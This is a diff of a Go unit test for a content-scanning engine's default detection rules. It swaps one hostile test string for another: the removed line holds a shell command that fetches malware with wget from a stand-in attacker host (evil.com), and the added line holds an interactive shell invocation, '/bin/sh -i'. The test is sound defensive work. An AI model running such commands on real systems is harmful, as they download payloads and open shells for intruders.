@@ -39,7 +39,7 @@ func TestScanSuspiciousContent(t *testing.T) {
 	e := NewEngine()
 	e.LoadDefaultRules()
 
-	if result := e.ScanBytes([]byte("/bin/sh -c wget http://evil.com/malware"), "suspicious.txt"); len(result) == 0 {
+	if result := e.ScanBytes([]byte("/bin/sh -i"), "suspicious.txt"); len(result) == 0 {
 		t.Error("expected at least one match for suspicious content")
 	}
 }
